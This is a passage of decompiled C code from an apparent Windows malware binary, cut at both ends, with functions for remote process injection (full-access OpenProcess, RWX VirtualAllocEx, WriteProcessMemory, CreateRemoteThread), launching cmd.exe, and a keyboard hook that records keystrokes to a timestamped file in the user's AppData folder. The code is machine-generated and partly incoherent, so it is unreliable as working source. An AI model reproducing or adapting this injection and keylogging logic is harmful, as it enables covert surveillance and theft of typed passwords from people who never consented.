    if (v6 % 0xffff != 0) {
        // 0x409b3b
        *v8 = v7 + 1;
    }
    // 0x409b44
    *(int32_t *)result = 1;
    function_406f1d();
    return result;
}

// Address range: 0x409b57 - 0x409bff
int32_t function_409b57(void) {
    // 0x409b57
    function_413473();
    int32_t * memory = VirtualAlloc(NULL, 255, 0x1000, 64); // 0x409b7a
    GetWindowsDirectoryA((char *)memory, 260);
    __asm_rep_movsd_memcpy((char *)(lstrlenA((char *)memory) + (int32_t)memory), "\\System32\\cmd.exe", 5);
    int32_t lpStartupInfo; // bp-100, 0x409b57
    function_401293(&lpStartupInfo, 0, 68);
    int32_t lpProcessInformation = 0; // bp-24, 0x409bb5
    bool v1; // 0x409b57
    int32_t v2 = v1 ? -4 : 4; // 0x409bb5
    int32_t v3 = v2 + (int32_t)&lpProcessInformation; // 0x409bb5
    *(int32_t *)v3 = 0;
    int32_t v4 = v3 + v2; // 0x409bb9
    *(int32_t *)v4 = 0;
    *(int32_t *)(v4 + v2) = 0;
    bool v5 = CreateProcessA((char *)memory, NULL, NULL, NULL, false, 0x8000000, NULL, NULL, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation); // 0x409bd0
    int32_t result; // 0x409b57
    if (!v5) {
        // 0x409bf2
        result = function_41344c();
    } else {
        // 0x409bda
        Sleep(1000);
        function_41344c();
    }
    // 0x409bfa
    return result;
}

// Address range: 0x409bff - 0x409cef
int32_t function_409bff(int32_t dwProcessId) {
    // 0x409bff
    if (g161 == 0) {
        // 0x409c15
        g161 = function_40a95a() != 0;
    }
    int32_t * hProcess = OpenProcess(0x1fffff, false, dwProcessId); // 0x409c2d
    if (hProcess == NULL) {
        // 0x409ceb
        return -1;
    }
    int32_t v1 = (int32_t)hProcess; // 0x409c2d
    int32_t v2 = v1; // bp-64, 0x409c50
    int32_t * lpAddress = VirtualAllocEx(hProcess, NULL, 0x100000, 0x3000, 64); // 0x409c51
    if (lpAddress == NULL) {
        // 0x409ce7
        *(int32_t *)((int32_t)&v2 - 4) = -2;
        // 0x409ceb
        return -2;
    }
    int32_t lpflOldProtect = 0; // bp-16, 0x409c61
    VirtualProtectEx(hProcess, lpAddress, 0x100000, 64, &lpflOldProtect);
    int32_t v3 = v1; // bp-104, 0x409c89
    int32_t * lpBaseAddress = VirtualAllocEx(hProcess, (int32_t *)0x33370000, 256, 0x3000, 64); // 0x409c8a
    if (lpBaseAddress == NULL) {
        // 0x409ce7
        *(int32_t *)((int32_t)&v3 - 4) = -2;
        // 0x409ceb
        return -2;
    }
    int32_t lpNumberOfBytesWritten = 0; // bp-8, 0x409c94
    int32_t v4 = v1; // bp-124, 0x409ca4
    if (!WriteProcessMemory(hProcess, lpBaseAddress, (int32_t *)"XXXXXX", 6, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != 6) {
        // 0x409ce3
        *(int32_t *)((int32_t)&v4 - 4) = -3;
        // 0x409ceb
        return -3;
    }
    int32_t lpNumberOfBytesWritten2 = 0; // bp-12, 0x409cb5
    int32_t v5 = v1; // bp-144, 0x409cc2
    int32_t v6 = &v5; // 0x409cc2
    int32_t lpBuffer; // 0x409bff
    if (!WriteProcessMemory(hProcess, lpAddress, (int32_t *)lpBuffer, lpBuffer, &lpNumberOfBytesWritten2)) {
        // 0x409ce3
        *(int32_t *)(v6 - 4) = -3;
        // 0x409ceb
        return -3;
    }
    // 0x409ccd
    if (lpNumberOfBytesWritten2 == lpBuffer) {
        // 0x409ceb
        return (int32_t)CreateRemoteThread(hProcess, NULL, 0, (int32_t (*)(int32_t *))lpAddress, NULL, 0, NULL);
    }
    // 0x409ce3
    *(int32_t *)(v6 - 4) = -3;
    // 0x409ceb
    return -3;
}

// Address range: 0x409cef - 0x409df9
int32_t function_409cef(int32_t a1) {
    int32_t v1 = a1;
    v1 = a1;
    if (g161 == 0) {
        // 0x409d07
        g161 = function_40a95a() != 0;
    }
    int32_t dwProcessId = v1; // 0x409d1a
    if (v1 == 0) {
        // 0x409d1c
        dwProcessId = function_409b57();
    }
    int32_t * v2 = OpenProcess(0x1fffff, false, dwProcessId); // 0x409d2a
    if (v2 == NULL) {
        // 0x409df4
        return -1;
    }
    int32_t v3 = (int32_t)v2; // 0x409d2a
    int32_t v4 = function_40a976(0, 0); // 0x409d49
    function_40aacd(v4, 0x100000, v3);
    int32_t v5 = function_40a976(0x33370000, 0); // 0x409d7f
    v1 = 0;
    if (function_40a8ab(v5, 256, 6, &v1) == 0 || v1 != 6) {
        // 0x409df4
        return -3;
    }
    // 0x409db8
    v1 = 0;
    int32_t v6; // 0x409cef
    if (function_40a8ab(v4, 0x100000, v6, &v1) == 0) {
        // 0x409df4
        return -3;
    }
    int32_t result = -3; // 0x409ddc
    if (v1 == v6) {
        // 0x409dde
        result = function_40aa22(v3, v3 >> 31, v4, 0x100000);
    }
    // 0x409df4
    return result;
}

// Address range: 0x409df9 - 0x409e8d
int32_t function_409df9(int32_t a1, int32_t a2) {
    // 0x409df9
    int128_t v1; // 0x409df9
    int128_t v2 = v1;
    int32_t result = g312; // 0x409e11
    if ((g312 || g313) == 0) {
        // 0x409e17
        int32_t v3; // 0x409df9
        result = function_409eee(v3, v3, (int32_t)&g322);
        g312 = result;
        if ((result || v3) == 0) {
            // 0x409e89
            return result;
        }
    }
    // 0x409e34
    int32_t v4; // 0x409df9
    while (*(char *)v4 != 0) {
        // 0x409e44
        v4++;
    }
    // 0x409e4b
    int64_t result2; // 0x409df9
    __asm_movlpd(0x100000000 * result2 >> 32, __asm_xorps(v2, v2));
    function_40a6de(result, g313, 4);
    // 0x409e89
    return result2;
}

// Address range: 0x409e8d - 0x409eee
int32_t function_409e8d(int32_t a1) {
    int32_t v1 = g316; // 0x409e90
    int32_t result; // 0x409e8d
    int32_t v2; // 0x409e8d
    int32_t v3; // 0x409e8d
    if (v1 == 0) {
        goto lab_0x409ea4;
    } else {
        // 0x409e9a
        result = v1;
        int32_t v4; // bp-8, 0x409e8d
        v3 = &v4;
        v2 = g307;
        if (g307 != 0) {
            goto lab_0x409edb;
        } else {
            goto lab_0x409ea4;
        }
    }
  lab_0x409ea4:;
    int32_t * hModule = GetModuleHandleW(L"ntdll.dll"); // 0x409eaa
    char * v5 = "RtlSetLastWin32Error"; // bp-28, 0x409ec0
    g316 = (int32_t)GetProcAddress(hModule, "RtlNtStatusToDosError");
    int32_t func = (int32_t)GetProcAddress(hModule, "RtlSetLastWin32Error"); // 0x409ecb
    g307 = func;
    result = g316;
    v3 = (int32_t)&v5;
    v2 = func;
    goto lab_0x409edb;
  lab_0x409edb:
    // 0x409edb
    if (result != 0 && v2 != 0) {
        // 0x409ee3
        *(int32_t *)(v3 - 4) = a1;
        *(int32_t *)(v3 - 8) = result;
    }
    // 0x409eeb
    return result;
}

// Address range: 0x409eee - 0x40a2ab
int32_t function_409eee(int32_t a1, int32_t a2, int32_t a3) {
    // 0x409eee
    return function_40a2ab();
}

// Address range: 0x40a2ab - 0x40a2d1
int32_t function_40a2ab(void) {
    int32_t result = g314; // 0x40a2b9
    if ((g315 || g314) == 0) {
        // 0x40a2bf
        int32_t v1; // 0x40a2ab
        result = function_40a2d1(v1, (int32_t)&g322, (int32_t)&g322);
        g314 = result;
    }
    // 0x40a2cf
    return result;
}

// Address range: 0x40a2d1 - 0x40a59d
int32_t function_40a2d1(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40a2d1
    int32_t result4; // 0x40a2d1
    uint32_t v1 = result4;
    if (g163 == 0) {
        // 0x40a300
        return 0;
    }
    int32_t result = function_40a59d(); // 0x40a2ea
    int32_t v2; // bp-596, 0x40a2d1
    int32_t v3 = &v2; // bp-8, 0x40a2f5
    if ((result || result4) != 0) {
        // 0x40a300
        return result;
    }
    // 0x40a34f
    int32_t v4; // bp-1492, 0x40a2d1
    v3 = &v4;
    if ((result4 || result4) != 0) {
        // 0x40a300
        return result;
    }
    // 0x40a3bb
    int32_t v5; // bp-364, 0x40a2d1
    v3 = &v5;
    if ((v1 || result4) != 0) {
        // 0x40a300
        return result;
    }
    // 0x40a433
    int16_t v6; // 0x40a2d1
    int32_t v7 = v6;
    int32_t v8; // bp-1508, 0x40a2d1
    int32_t * v9 = (int32_t *)((int32_t)&v8 - 4);
    while ((result4 || result4) == 0) {
        // 0x40a4b7
        *v9 = v7;
        int32_t result3 = function_401000((int32_t)&g322); // 0x40a4bf
        v3 = result3;
        int32_t result2 = 0; // 0x40a4ca
        if (result3 == 0) {
            // 0x40a300
            return result2;
        }
        if ((result4 || result4) != 0 && v6 != 0) {
            // 0x40a4fc
            *v9 = 56;
            return result3;
        }
        int32_t v10 = function_40a845(v7, &v3, 1, result3); // 0x40a54e
        function_402727();
        if (result4 == v1 + 16 == result4 == result4 + (int32_t)(v1 > 0xffffffef) || v10 == 0) {
            // 0x40a300
            result2 = v10 == 0 ? result4 : 0;
            return result2;
        }
    }
    // 0x40a468
    *v9 = 56;
    return result4;
}

// Address range: 0x40a59d - 0x40a5b9
int32_t function_40a59d(void) {
    // 0x40a59d
    int128_t v1; // 0x40a59d
    int128_t v2 = v1;
    int32_t result; // 0x40a59d
    __asm_movlpd((int64_t)result, __asm_xorps(v2, v2));
    return result;
}

// Address range: 0x40a5b9 - 0x40a5d0
int32_t function_40a5b9(int32_t a1) {
    // 0x40a5b9
    int32_t v1; // 0x40a5b9
    int32_t result; // 0x40a5b9
    *(int32_t *)(result - 8) = (int32_t)&v1;
    return result;
}

// Address range: 0x40a5d0 - 0x40a5db
int32_t function_40a5d0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40a5d0
    int32_t v1; // 0x40a5d0
    return *(int32_t *)(v1 - 8);
}

// Address range: 0x40a5db - 0x40a61a
int32_t function_40a5db(int32_t a1, int32_t result) {
    // 0x40a5db
    if ((result || a1) == 0) {
        // 0x40a600
        int32_t v1; // 0x40a5db
        return function_40a662(v1, v1, v1);
    }
    // 0x40a604
    return result;
}

// Address range: 0x40a61a - 0x40a65f
int32_t function_40a61a(int32_t a1) {
    // 0x40a61a
    int32_t v1; // 0x40a61a
    int32_t v2 = *(int32_t *)(v1 - 8); // 0x40a61c
    int32_t v3 = *(int32_t *)(v1 - 20); // 0x40a620
    uint32_t v4 = *(int32_t *)(v1 - 12); // 0x40a623
    uint32_t result = v4 % 4; // 0x40a628
    int32_t v5 = v3; // 0x40a62e
    int32_t v6 = v2; // 0x40a62e
    bool v7; // 0x40a61a
    if (v4 < 4) {
      lab_0x40a632:;
        int32_t v8 = v5; // 0x40a61a
        int32_t v9 = v6; // 0x40a61a
        switch (result) {
            case 0: {
                // 0x40a647
                *(char *)(v1 - 1) = 1;
                // 0x40a64b
                return result;
            }
            default: {
                // 0x40a63b
                if (*(int16_t *)v5 != *(int16_t *)v6) {
                    // 0x40a64b
                    return result;
                }
                int32_t v10 = v7 ? -2 : 2; // 0x40a63b
                v8 = v5 + v10;
                v9 = v6 + v10;
                if (result == 2) {
                    // 0x40a647
                    *(char *)(v1 - 1) = 1;
                    // 0x40a64b
                    return result;
                }
            }
            case 1: {
                // 0x40a644
                if (*(char *)v8 != *(char *)v9) {
                    // 0x40a64b
                    return result;
                }
                // 0x40a647
                *(char *)(v1 - 1) = 1;
                // 0x40a64b
                return result;
            }
        }
    }
    int32_t v11 = v7 ? -4 : 4; // 0x40a62e
    int32_t v12 = v2; // 0x40a62e
    int32_t v13 = v3; // 0x40a62e
    int32_t v14 = v4 / 4; // 0x40a62e
    while (*(int32_t *)v13 == *(int32_t *)v12) {
        v12 += v11;
        v13 += v11;
        v14--;
        v5 = v13;
        v6 = v12;
        if (v14 == 0) {
            goto lab_0x40a632;
        }
    }
    // 0x40a64b
    return result;
}

// Address range: 0x40a662 - 0x40a667
int32_t function_40a662(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40a662
    int32_t result; // 0x40a662
    return result;
}

// Address range: 0x40a667 - 0x40a6de
int32_t function_40a667(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40a667
    int32_t v1; // 0x40a667
    return v1 == 0 ? v1 : a3;
}

// Address range: 0x40a6de - 0x40a7c6
int32_t function_40a6de(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40a6de
    int128_t v1; // 0x40a6de
    int128_t v2 = v1;
    if (g163 == 0) {
        // 0x40a6f0
        int32_t v3; // 0x40a6de
        return function_40a840(v3, v3, v3);
    }
    int64_t v4; // 0x40a6de
    int128_t v5; // 0x40a6de
    int128_t v6; // 0x40a6de
    if (a1 < 1) {
        int128_t v7 = __asm_xorps(v2, v2); // 0x40a718
        __asm_movlpd(0x100000000 * v4 >> 32, v7);
        v5 = v7;
        goto lab_0x40a742;
    } else {
        if (a1 < 2) {
            goto lab_0x40a742;
        } else {
            if (a1 < 3) {
                goto lab_0x40a764;
            } else {
                if (a1 >= 4) {
                    // 0x40a786
                    int128_t v8; // 0x40a6de
                    v6 = v8;
                    __asm_movlpd(v4, __asm_xorps(v6, v6));
                    return 43;
                }
                goto lab_0x40a77e;
            }
        }
    }
  lab_0x40a742:;
    int128_t v9 = v5;
    int128_t v10 = __asm_xorps(v9, v9); // 0x40a73a
    __asm_movlpd(0x100000000 * v4 >> 32, v10);
    int128_t v11 = v10; // 0x40a6de
    goto lab_0x40a764;
  lab_0x40a764:;
    int128_t v12 = v11;
    int128_t v13 = __asm_xorps(v12, v12); // 0x40a75c
    __asm_movlpd(0x100000000 * v4 >> 32, v13);
    int128_t v14 = v13; // 0x40a6de
    goto lab_0x40a77e;
  lab_0x40a77e:;
    int128_t v15 = v14;
    int128_t v16 = __asm_xorps(v15, v15); // 0x40a77e
    __asm_movlpd(0x100000000 * v4 >> 32, v16);
    // 0x40a786
    v6 = v16;
    __asm_movlpd(v4, __asm_xorps(v6, v6));
    return 43;
}

// Address range: 0x40a7c6 - 0x40a82a
int32_t function_40a7c6(void) {
    // 0x40a7c6
    int32_t v1; // 0x40a7c6
    int32_t * v2 = (int32_t *)(v1 - 52); // 0x40a7d9
    uint32_t v3 = *v2; // 0x40a7d9
    int32_t v4; // 0x40a7c6
    int32_t v5; // bp-8, 0x40a7c6
    int32_t v6 = (int32_t)(v3 % 2 != 0 ? &v4 : &v5) - 4; // 0x40a7e3
    int32_t v7 = v6; // 0x40a7eb
    if (v3 != 2) {
        int32_t v8 = v3 - 3; // 0x40a7ed
        v7 = v6;
        if (v8 != 1) {
            int32_t v9 = 8 * v8 - 8 + *(int32_t *)(v1 - 68); // 0x40a7c6
            int32_t v10 = v8; // 0x40a7fe
            int32_t v11 = v6; // 0x40a7f7
            v11 -= 4;
            *(int32_t *)v11 = *(int32_t *)v9;
            v10 -= 4;
            v9 -= 8;
            v7 = v11;
            while (v10 != 1) {
                // 0x40a7f7
                v11 -= 4;
                *(int32_t *)v11 = *(int32_t *)v9;
                v10 -= 4;
                v9 -= 8;
                v7 = v11;
            }
        }
    }
    int32_t v12 = 8 * *v2 + v7; // 0x40a80f
    *(int32_t *)(v1 - 60) = -4;
    *(int32_t *)(v12 + 8) = 35;
    int32_t * v13 = (int32_t *)(v12 + 4); // 0x40a825
    *v13 = *v13 + 13;
    return -4;
}

// Address range: 0x40a840 - 0x40a845
int32_t function_40a840(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40a840
    int32_t result; // 0x40a840
    return result;
}

// Address range: 0x40a845 - 0x40a8ab
int32_t function_40a845(int32_t a1, int32_t * a2, char a3, int32_t a4) {
    // 0x40a845
    int32_t v1; // bp-20, 0x40a845
    int32_t * v2 = (int32_t *)((int32_t)&v1 - 4); // 0x40a85b
    int32_t v3; // 0x40a845
    int32_t v4; // 0x40a845
    int16_t v5 = *(int16_t *)((int32_t)L"ntdll.dll" - v4 + v3); // 0x40a855
    *v2 = 25;
    int16_t v6 = *(int16_t *)v3; // 0x40a86c
    *v2 = 25;
    uint16_t v7 = v5 < 91 ? v5 + 32 : v5;
    uint16_t v8 = v6 > 90 ? v6 : v6 + 32;
    while (v7 != 0) {
        // 0x40a89c
        v3 += 2;
        if (v7 != v8) {
            // break -> 0x40a8a1
            break;
        }
        v5 = *(int16_t *)((int32_t)L"ntdll.dll" - v4 + v3);
        *v2 = 25;
        v6 = *(int16_t *)v3;
        *v2 = 25;
        v7 = v5 < 91 ? v5 + 32 : v5;
        v8 = v6 > 90 ? v6 : v6 + 32;
    }
    // 0x40a8a1
    return (int32_t)v7 - (int32_t)v8;
}

// Address range: 0x40a8ab - 0x40a95a
int32_t function_40a8ab(int32_t a1, int32_t a2, int32_t a3, int32_t * a4) {
    int32_t v1 = g317; // 0x40a8c7
    int32_t v2; // 0x40a8ab
    if ((g317 || g318) == 0) {
        // 0x40a8cd
        v1 = function_409df9(function_40a2ab(), v2);
        g317 = v1;
        if ((v1 || v2) == 0) {
            // 0x40a955
            return 0;
        }
    }
    int32_t v3 = 0; // 0x40a8fd
    if (a4 != NULL) {
        // 0x40a8ff
        v3 = *a4;
    }
    int32_t v4 = function_40a6de(v1, g318, 5); // 0x40a92c
    if (v2 > -1 != (v4 == 0)) {
        // 0x40a94a
        function_409e8d(v4);
        // 0x40a955
        return 0;
    }
    // 0x40a93c
    if (a4 != NULL) {
        // 0x40a940
        *a4 = v3;
    }
    // 0x40a955
    return 1;
}

// Address range: 0x40a95a - 0x40a976
int32_t function_40a95a(void) {
    // 0x40a95a
    IsWow64Process(GetCurrentProcess(), (bool *)&g322);
    GetProcessHeap();
    return 1;
}

// Address range: 0x40a976 - 0x40aa22
int32_t function_40a976(int32_t a1, int32_t a2) {
    int32_t v1 = g308; // 0x40a992
    int32_t v2; // 0x40a976
    if ((g308 || g309) == 0) {
        // 0x40a998
        v1 = function_409df9(function_40a2ab(), v2);
        g308 = v1;
        if ((v1 || v2) == 0) {
            // 0x40aa1d
            return 0;
        }
    }
    int32_t v3 = function_40a6de(v1, g309, 6); // 0x40a9f8
    int32_t result = a1; // 0x40aa02
    if (v2 > -1 != (v3 == 0)) {
        // 0x40aa10
        function_409e8d(v3);
        result = 0;
    }
    // 0x40aa1d
    return result;
}

// Address range: 0x40aa22 - 0x40aacd
int32_t function_40aa22(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40aa22
    int128_t v1; // 0x40aa22
    int128_t v2 = v1;
    int64_t v3; // 0x40aa22
    __asm_movlpd(v3, __asm_xorps(v2, v2));
    int32_t v4 = 0; // bp-28, 0x40aa43
    bool v5; // 0x40aa22
    int32_t v6 = v5 ? -4 : 4; // 0x40aa43
    int32_t v7 = v6 + (int32_t)&v4; // 0x40aa43
    *(int32_t *)v7 = 0;
    int32_t v8 = v7 + v6; // 0x40aa44
    *(int32_t *)v8 = 0;
    *(int32_t *)(v8 + v6) = 0;
    int32_t v9 = g319; // 0x40aa4b
    if ((g319 || g320) == 0) {
        // 0x40aa51
        int32_t v10; // 0x40aa22
        v9 = function_409df9(function_40a2ab(), v10);
        g319 = v9;
        if ((v9 || v10) == 0) {
            // 0x40aac9
            return 0;
        }
    }
    int32_t v11 = function_40a6de(v9, g320, 10); // 0x40aaa4
    int64_t v12; // bp-12, 0x40aa22
    int32_t result; // 0x40aa22
    if (&v12 > (int64_t *)-1 == v11 == 0) {
        // 0x40aab4
        result = v12;
    } else {
        // 0x40aabc
        function_409e8d(v11);
        result = 0;
    }
    // 0x40aac9
    return result;
}

// Address range: 0x40aacd - 0x40ab70
int32_t function_40aacd(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g310; // 0x40aae6
    int32_t v2; // 0x40aacd
    if ((g310 || g311) == 0) {
        // 0x40aaec
        v1 = function_409df9(function_40a2ab(), v2);
        g310 = v1;
        if ((v1 || v2) == 0) {
            // 0x40ab6b
            return 0;
        }
    }
    int32_t v3 = function_40a6de(v1, g311, 5); // 0x40ab4d
    int32_t result = 1; // 0x40ab57
    if (v2 > -1 != (v3 == 0)) {
        // 0x40ab60
        function_409e8d(v3);
        result = 0;
    }
    // 0x40ab6b
    return result;
}

// Address range: 0x40ab70 - 0x40acf4
int32_t function_40ab70(void) {
    // 0x40ab70
    GetModuleHandleA(NULL);
    int32_t v1 = 0; // bp-216, 0x40ab95
    bool v2; // 0x40ab70
    int32_t v3 = v2 ? -4 : 4; // 0x40ab95
    int32_t v4 = v3 + (int32_t)&v1; // 0x40ab95
    *(int32_t *)v4 = 0;
    int32_t v5 = v4 + v3; // 0x40ab9b
    *(int32_t *)v5 = 0;
    *(int32_t *)(v5 + v3) = 0;
    function_401293((int32_t *)(g165 + 528), 0, 2048);
    int32_t v6 = g165 + 16; // 0x40abb0
    function_401293((int32_t *)v6, 0, 520);
    int32_t lpSystemTime = 0; // bp-244, 0x40abc3
    SHGetFolderPathW(NULL, 28, NULL, 0, (int16_t *)v6);
    lstrcatW((int16_t *)(g165 + 16), (int16_t *)&g16);
    GetLocalTime((struct _SYSTEMTIME *)&lpSystemTime);
    int32_t lpOut; // bp-204, 0x40ab70
    wsprintfW((int16_t *)&lpOut, L"%02d-%02d-%02d_%02d.%02d.%02d");
    lstrcatW((int16_t *)(g165 + 16), (int16_t *)&lpOut);
    function_40428f(g165 + 16);
    int32_t lpFileName = *(int32_t *)(g165 + 12); // 0x40ac5d
    int32_t v7 = (int32_t)CreateFileW((int16_t *)lpFileName, 0x10000000, 1, NULL, 2, 128, NULL); // 0x40ac60
    int32_t hObject = v7; // bp-312, 0x40ac6c
    *(int32_t *)(g165 + 4) = v7;
    CloseHandle((int32_t *)hObject);
    function_415e27();
    if (function_4147a3() != 0) {
        // 0x40ac95
        g164 = function_41473a();
    }
    int32_t v8 = &hObject;
    *(int32_t *)(v8 - 4) = 0;
    *(int32_t *)(v8 - 8) = 0;
    *(int32_t *)(v8 - 12) = 0;
    *(int32_t *)(v8 - 16) = v8 + 36;
    bool v9 = GetMessageA((struct tagMSG *)&g322, &g322, (int32_t)&g322, (int32_t)&g322); // 0x40ace3
    while (!v9 == v9) {
        // 0x40acc5
        *(int32_t *)(v8 - 20) = v8 + 20;
        TranslateMessage((struct tagMSG *)&g322);
        int32_t v10 = v8 - 24; // 0x40acd4
        *(int32_t *)v10 = v8 + 16;
        DispatchMessageA((struct tagMSG *)&g322);
        v8 = v10;
        *(int32_t *)(v8 - 4) = 0;
        *(int32_t *)(v8 - 8) = 0;
        *(int32_t *)(v8 - 12) = 0;
        *(int32_t *)(v8 - 16) = v8 + 36;
        v9 = GetMessageA((struct tagMSG *)&g322, &g322, (int32_t)&g322, (int32_t)&g322);
    }
    // 0x40ace9
    return 0;
}

// Address range: 0x40acf4 - 0x40ad09
int32_t function_40acf4(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40acf4
    return function_40ad09(a3);
}

// Address range: 0x40ad09 - 0x40b12c
int32_t function_40ad09(int32_t a1) {
    // 0x40ad09
    int32_t v1; // bp-68, 0x40ad09
    int32_t v2 = &v1; // 0x40ad1b
    int32_t nVirtKey; // 0x40ad09
    int32_t v3 = nVirtKey - 256; // 0x40ad1f
    int32_t v4 = v2; // 0x40ad24
    int32_t v5; // 0x40ad09
    int32_t v6; // bp-72, 0x40ad09
    int16_t * v7; // bp-80, 0x40ad09
    if (v3 != 0 == (v3 != 4)) {
        goto lab_0x40b118;
    } else {
        uint32_t v8 = *(int32_t *)a1; // 0x40ad2f
        if (v8 < 39) {
            if (v8 < 18) {
                // 0x40b094
                v5 = v2;
                v4 = v2;
                switch (v8) {
                    case 17: {
                        goto lab_0x40b113;
                    }
                    case 8: {
                        goto lab_0x40b113;
                    }
                    case 9: {
                        goto lab_0x40b113;
                    }
                    case 13: {
                        goto lab_0x40b113;
                    }
                    case 16: {
                        goto lab_0x40b118;
                    }
                    default: {
                        goto lab_0x40b0da;
                    }
                }
            } else {
                // 0x40b0c5
                v5 = v2;
                switch (v8) {
                    case 18: {
                        goto lab_0x40b113;
                    }
                    case 20: {
                        goto lab_0x40b113;
                    }
                    case 32: {
                        goto lab_0x40b113;
                    }
                    case 27: {
                        goto lab_0x40b113;
                    }
                    default: {
                        goto lab_0x40b0da;
                    }
                }
            }
        } else {
            int32_t lpOut; // bp-24, 0x40ad09
            if (v8 < 65) {
                // 0x40ad43
                v6 = 16;
                int32_t v9 = &v6; // 0x40ad43
                if (GetAsyncKeyState(16) == 0) {
                    // 0x40adc7
                    v7 = L"%c";
                    wsprintfW((int16_t *)&lpOut, L"%c");
                    v5 = v9;
                    goto lab_0x40b113;
                } else {
                    int32_t v10 = v8 - 48; // 0x40ad50
                    g321 = v10;
                    v5 = v9;
                    v4 = v9;
                    if (v10 < 10) {
                        goto lab_0x40b113;
                    } else {
                        goto lab_0x40b118;
                    }
                }
            } else {
                if (v8 >= 91) {
                    if (v8 < 105) {
                        // 0x40ae37
                        v5 = v2;
                        if (v8 == 104) {
                            goto lab_0x40b113;
                        } else {
                            if (v8 < 100) {
                                // 0x40ae42
                                v5 = v2;
                                switch (v8) {
                                    case 99: {
                                        goto lab_0x40b113;
                                    }
                                    case 96: {
                                        goto lab_0x40b113;
                                    }
                                    default: {
                                        int32_t v11 = v8 - 97; // 0x40ae4e
                                        v5 = v2;
                                        if (v11 != 0 == (v11 != 1)) {
                                            goto lab_0x40b0da;
                                        } else {
                                            goto lab_0x40b113;
                                        }
                                    }
                                }
                            } else {
                                // 0x40ae8e
                                v5 = v2;
                                if ((v8 & -2) == 100) {
                                    goto lab_0x40b113;
                                } else {
                                    int32_t v12 = v8 - 102; // 0x40ae98
                                    v5 = v2;
                                    if (v12 != 0 == (v12 != 1)) {
                                        goto lab_0x40b0da;
                                    } else {
                                        goto lab_0x40b113;
                                    }
                                }
                            }
                        }
                    } else {
                        if (v8 < 189) {
                            if (v8 == 188) {
                                // 0x40af7c
                                v6 = 16;
                                GetAsyncKeyState(16);
                                v5 = &v6;
                                goto lab_0x40b113;
                            } else {
                                if (v8 > 163) {
                                    // 0x40af28
                                    v5 = v2;
                                    if ((v8 & -2) == 164) {
                                        goto lab_0x40b113;
                                    } else {
                                        int32_t v13 = v8 - 186; // 0x40af3d
                                        if (v13 == 0) {
                                            // 0x40af68
                                            v6 = 16;
                                            GetAsyncKeyState(16);
                                            v5 = &v6;
                                            goto lab_0x40b113;
                                        } else {
                                            if (v13 != 1) {
                                                goto lab_0x40b0da;
                                            } else {
                                                // 0x40af4b
                                                v6 = 16;
                                                GetAsyncKeyState(16);
                                                v5 = &v6;
                                                goto lab_0x40b113;
                                            }
                                        }
                                    }
                                } else {
                                    // 0x40aef2
                                    v5 = v2;
                                    v4 = v2;
                                    switch (v8) {
                                        case 163: {
                                            goto lab_0x40b113;
                                        }
                                        case 105: {
                                            goto lab_0x40b113;
                                        }
                                        case 160: {
                                            goto lab_0x40b118;
                                        }
                                        default: {
                                            int32_t v14 = v8 - 161; // 0x40af02
                                            v4 = v2;
                                            if (v14 == 0) {
                                                goto lab_0x40b118;
                                            } else {
                                                // 0x40af0b
                                                v5 = v2;
                                                if (v14 != 1) {
                                                    goto lab_0x40b0da;
                                                } else {
                                                    goto lab_0x40b113;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        } else {
                            if (v8 < 220) {
                                switch (v8) {
                                    case 219: {
                                        // 0x40b013
                                        v6 = 16;
                                        GetAsyncKeyState(16);
                                        v5 = &v6;
                                        goto lab_0x40b113;
                                    }
                                    case 189: {
                                        // 0x40affc
                                        v6 = 16;
                                        GetAsyncKeyState(16);
                                        v5 = &v6;
                                        goto lab_0x40b113;
                                    }
                                    case 190: {
                                        // 0x40afe5
                                        v6 = 16;
                                        GetAsyncKeyState(16);
                                        v5 = &v6;
                                        goto lab_0x40b113;
                                    }
                                    default: {
                                        int32_t v15 = v8 - 191; // 0x40afac
                                        if (v15 == 0) {
                                            // 0x40afce
                                            v6 = 16;
                                            GetAsyncKeyState(16);
                                            v5 = &v6;
                                            goto lab_0x40b113;
                                        } else {
                                            if (v15 != 1) {
                                                goto lab_0x40b0da;
                                            } else {
                                                // 0x40afba
                                                v6 = 16;
                                                GetAsyncKeyState(16);
                                                v5 = &v6;
                                                goto lab_0x40b113;
                                            }
                                        }
                                    }
                                }
                            } else {
                                if (v8 == 220) {
                                    // 0x40b06e
                                    v6 = 16;
                                    GetAsyncKeyState(16);
                                    v5 = &v6;
                                    goto lab_0x40b113;
                                } else {
                                    int32_t v16 = v8 - 221; // 0x40b032
                                    if (v16 == 0) {
                                        // 0x40b057
                                        v6 = 16;
                                        GetAsyncKeyState(16);
                                        v5 = &v6;
                                        goto lab_0x40b113;
                                    } else {
                                        if (v16 != 1) {
                                            goto lab_0x40b0da;
                                        } else {
                                            // 0x40b040
                                            v6 = 16;
                                            GetAsyncKeyState(16);
                                            v5 = &v6;
                                            goto lab_0x40b113;
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    // 0x40ade7
                    GetKeyState(nVirtKey);
                    v6 = 16;
                    GetAsyncKeyState(16);
                    function_40b155();
                    v7 = L"%c";
                    wsprintfW((int16_t *)&lpOut, L"%c");
                    function_40b172();
                    v4 = &v6;
                    goto lab_0x40b118;
                }
            }
        }
    }
  lab_0x40b118:
    // 0x40b118
    *(int32_t *)(v4 - 4) = a1;
    *(int32_t *)(v4 - 16) = 0;
    int32_t result = CallNextHookEx(&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x40b11f
    return result;
  lab_0x40b113:
    // 0x40b113
    function_40b172();
    v4 = v5;
    goto lab_0x40b118;
  lab_0x40b0da:
    // 0x40b0da
    v6 = 15;
    int32_t lParam = 0x10000 * (256 * *(int32_t *)(a1 + 8) + *(int32_t *)(a1 + 4)) | 1; // 0x40b0ec
    v7 = (int16_t *)lParam;
    int32_t lpString; // bp-56, 0x40ad09
    GetKeyNameTextW(lParam, (int16_t *)&lpString, 15);
    v5 = (int32_t)&v7;
    goto lab_0x40b113;
}
